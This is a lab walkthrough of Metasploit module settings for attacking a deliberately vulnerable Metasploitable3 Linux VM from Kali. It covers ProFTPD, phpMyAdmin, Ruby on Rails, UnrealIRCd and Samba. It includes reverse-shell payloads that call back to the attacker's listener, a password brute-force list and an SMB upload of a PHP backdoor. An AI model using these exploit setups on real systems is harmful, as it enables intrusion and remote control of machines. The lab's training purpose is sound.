## Metasploit on the Linux Metasploitable3 

Here are several labs on running Metasploit from Kali on a Metasploitable3 Linux VM. Please make sure when you execute these labs you verify that home environment setup is working properly and you are able to scan the Metasploitable 3 Linux host from Kali using NMAP. Typically when you find the Metasploitable3 system it will have 5 or more open ports. This walkthrough is intended to get your familiar with the Metasploit tool and the options required to successfully execute the exploit.

## ProFTPD

`use exploit/unix/ftp/proftpd_modcopy_exec`

`set payload cmd/unix/reverse_perl`

`set rhosts xxx.xxx.xxx.xxx`

`set rport 80` (but it should already be set to that)

`set rport_ftp 21`

`set targeturi /`

`set tmppath /tmp`

`set sitepath /var/www/html`

`set lhost xxx.xxx.xxx.xxx` (this should be your kali linux IP address)

`set lport 4444` (Port on your system exploit and payload runs to create session)

`set payload cmd/unix/reverse_perl`

## phpMyAdmin

use auxiliary/scanner/http/phpMyAdmin_login
set rhosts 192.168.1.171
set USER_AS_PASS true
set targeturi /phpMyAdmin/index.php
set user_file /tmp/users.txt
set pass_file /tmp/passwords.txt

echo root >> /tmp/users.txt
echo admin >> /tmp/users.txt
echo user >> /tmp/users.txt

echo password >> /tmp/passwords.txt
echo Password >> /tmp/passwords.txt


## Ruby On Rails
`use exploit/multi/http/rails_actionpack_inline_exec`

`set rhost xxx.xxx.xxx.xxx` (IP of the host you are attacking)

`set rport 3500` (Port number Ruby app is listening on)

`set lhost xxx.xxx.xxx.xxx` (IP of the Kail VM you are attacking from)

`set lport 4444` (Port on your system exploit and payload runs to create session)

`set targeturi readme`

`set targetparam os`

`set payload ruby/shell_reverse_tcp`


## Unreal IRC

`use exploit/unix/irc/unreal_ircd_3281_backdoor`

`set rhost xxx.xxx.xxx.xxx` (IP of the host you are attacking)

`set rport 6697` (Port number IRC app is listening on)

`set lhost xxx.xxx.xxx.xxx` (IP of the Kail VM you are attacking from)

`set lport 4444` (Port on your system exploit and payload runs to create session)

`set payload cmd/unix/reverse`

## Samba FTP

`use auxiliary/admin/smb/upload_file`

`set rhosts xxx.xxx.xxx.xxx`

`set rport 445`

`set rport_ftp 21`

`set smbshare public`

`set smbuser chewbacca`

`set lpath /tmp/backdoor.php`

`set rpath backdoor.php`

`set lhost xxx.xxx.xxx.xxx` (this should be your kali linux IP address)

`set lport 4444` (Port on your system exploit and payload runs to create session)
